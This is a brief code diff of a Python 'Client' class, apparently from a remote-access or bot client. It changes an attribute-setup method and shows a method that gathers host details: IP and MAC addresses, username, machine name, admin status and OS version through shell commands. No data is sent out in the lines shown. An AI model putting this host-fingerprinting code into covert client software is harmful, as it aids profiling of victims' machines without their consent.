@@ -112,7 +112,7 @@ class Client(object):
     
     def _cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
 
-    def _setup(self, **kwargs): return [setattr(self, chr(i), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]
+    def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]
 
     def _info(self): return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).replace('\n','') if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
 
